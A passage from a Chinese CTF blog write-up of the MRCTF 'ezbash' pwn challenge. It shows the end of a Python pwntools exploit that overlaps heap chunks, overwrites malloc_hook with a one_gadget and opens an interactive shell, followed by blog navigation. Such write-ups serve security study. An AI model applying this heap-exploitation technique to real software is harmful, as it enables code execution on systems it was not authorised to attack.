class="number">0x130</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x120</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x130</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x1</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;mmmm&#x27;</span>)</span><br><span class="line">dbg()</span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;brva 0x01884&#x27;)</span></span><br><span class="line"><span class="comment">#change the chunksize wo achieve overlap</span></span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;\x51\x04&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">free(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">dbg()</span><br><span class="line">mkdir(<span class="string">b&#x27;dir&#x27;</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x70</span>,<span class="string">b&#x27;dir&#x27;</span>)</span><br><span class="line">mkdir(<span class="string">b&#x27;dir2&#x27;</span>)</span><br><span class="line">mkdir(<span class="string">b&#x27;dir3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="string">b&#x27;dir3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;malloc_hook : &quot;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"><span class="built_in">print</span>(p64(malloc_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pad = p64(malloc_hook)</span><br><span class="line"><span class="built_in">print</span>(pad[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(pad[<span class="number">5</span>:<span class="number">7</span>])</span><br><span class="line">malloc(<span class="number">0x8</span>,<span class="string">b&#x27;dir2&#x27;</span>,pad[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">dbg()</span><br><span class="line">pad = p64(onegadget)</span><br><span class="line">echo(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x23</span>)+pad[<span class="number">0</span>:<span class="number">6</span>],<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">touch(<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>题目文件在链接里</p>

      <div class="tags">
          <a href="/tags/writeup/" rel="tag"><i class="ic i-tag"></i> writeup</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-04-25 16:07:02" itemprop="dateModified" datetime="2022-04-25T16:07:02+08:00">2022-04-25</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="dreamcat WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="dreamcat Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="dreamcat PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>dreamcat <i class="ic i-at"><em>@</em></i>我他喵的
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2022/04/25/MRCTF-ezbash/" title="MRCTF_ezbash">http://example.com/2022/04/25/MRCTF-ezbash/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/04/19/starctf-babynote/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipesx5fdwj20zk0m81kx.jpg" title="starctf_babynote">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> pwn</span>
  <h3>starctf_babynote</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclj61ylzj20zk0m8b29.jpg" title="强网杯2018_core">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> kernel</span>
  <h3>强网杯2018_core</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mrctf-pwnezbash"><span class="toc-number">1.</span> <span class="toc-text"> MRCTF 	pwn	ezbash</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text"> 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text"> 解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%9A%84%E6%95%B4%E4%BD%93%E6%8A%8A%E6%8F%A1"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 题目的整体把握</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ls"><span class="toc-number">1.3.1.1.</span> <span class="toc-text"> ls</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cd"><span class="toc-number">1.3.1.2.</span> <span class="toc-text"> cd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cat"><span class="toc-number">1.3.1.3.</span> <span class="toc-text"> cat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwd"><span class="toc-number">1.3.1.4.</span> <span class="toc-text"> pwd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exithelp"><span class="toc-number">1.3.1.5.</span> <span class="toc-text"> exit,help</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mkdir"><span class="toc-number">1.3.1.6.</span> <span class="toc-text"> mkdir</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#touch"><span class="toc-number">1.3.1.7.</span> <span class="toc-text"> touch</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rm"><span class="toc-number">1.3.1.8.</span> <span class="toc-text"> rm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#echo"><span class="toc-number">1.3.1.9.</span> <span class="toc-text"> echo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cp"><span class="toc-number">1.3.1.10.</span> <span class="toc-text"> cp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 泄露 libc 地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 泄露堆地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 最后的攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.4.</span> <span class="toc-text"> exp</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
        <ul>
          <li><a href="/2022/03/19/pwnable-seethefile/" rel="bookmark" title="pwnable_seethefile">pwnable_seethefile</a></li><li><a href="/2022/03/20/buuoj-heapcreator/" rel="bookmark" title="buuoj_heapcreator">buuoj_heapcreator</a></li><li><a href="/2022/03/21/roarctf-2019-easypwn/" rel="bookmark" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></li><li><a href="/2022/03/22/tw2017parrot/" rel="bookmark" title="tw2017parrot">tw2017parrot</a></li><li><a href="/2022/04/01/note-file/" rel="bookmark" title="note_file">note_file</a></li><li><a href="/2022/04/01/tcache-tear/" rel="bookmark" title="tcache_tear">tcache_tear</a></li><li><a href="/2022/04/10/pwnable-bookwriter/" rel="bookmark" title=""></a></li><li><a href="/2022/04/14/heap-paradise/" rel="bookmark" title="heap_paradise">heap_paradise</a></li><li><a href="/2022/04/18/starctf_examination/" rel="bookmark" title="examination">examination</a></li><li><a href="/2022/04/19/starctf-babynote/" rel="bookmark" title="starctf_babynote">starctf_babynote</a></li><li class="active"><a href="/2022/04/25/MRCTF-ezbash/" rel="bookmark" title="MRCTF_ezbash">MRCTF_ezbash</a></li><li><a href="/2022/05/10/chunzhiIOT/" rel="bookmark" title="chunzhiIOT">chunzhiIOT</a></li><li><a href="/2022/05/10/torghast/" rel="bookmark" title="torghast">torghast</a></li><li><a href="/2022/05/13/pwnable-re-alloc/" rel="bookmark" title="pwnable-re-alloc">pwnable-re-alloc</a></li><li><a href="/2022/06/18/ciscn2022-syscall/" rel="bookmark" title="ciscn2022_syscall">ciscn2022_syscall</a></li><li><a href="/2022/06/19/ciscn-2022-popcalc/" rel="bookmark" title="ciscn_2022_popcalc">ciscn_2022_popcalc</a></li><li><a href="/2022/06/20/ciscn-2022-planecoode/" rel="bookmark" title="ciscn_2022_planecoode">ciscn_2022_planecoode</a></li><li><a href="/2022/09/20/tctf2022ezvm/" rel="bookmark" title="tctf2022ezvm">tctf2022ezvm</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="dreamcat"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">dreamcat</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">33</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">4</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">8</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/04/19/starctf-babynote/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/" title="glibc-2.35一些手法">glibc-2.35一些手法</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/03/22/tw2017parrot/" title="tw2017parrot">tw2017parrot</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/mobile/" title="In mobile">mobile</a>
</div>

    <span><a href="/2022/07/18/adworld-%E5%9F%BA%E7%A1%80%E7%9A%84android/" title="adworld_基础的android">adworld_基础的android</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/04/25/MRCTF-ezbash/" title="MRCTF_ezbash">MRCTF_ezbash</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/05/12/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/" title="逆向常见算法">逆向常见算法</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/07/20/360dsctf2022-eznote/" title="360dsctf2022_eznote">360dsctf2022_eznote</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/06/21/ciscn-2022-whatheap/" title="ciscn_2022_whatheap">ciscn_2022_whatheap</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/kernel/" title="In kernel">kernel</a>
</div>

    <span><a href="/2022/05/02/ciscn-babydriver/" title="ciscn_babydriver">ciscn_babydriver</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/04/18/starctf_examination/" title="examination">examination</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/begin/" title="In begin">begin</a>
</div>

    <span><a href="/2021/03/19/hello-world/" title="Hello World">Hello World</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">dreamcat @ dreamcat</span>
  </div>
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="Symbols count total">282k words</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="Reading time total">4:16</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/04/25/MRCTF-ezbash/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)dreamcat?"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
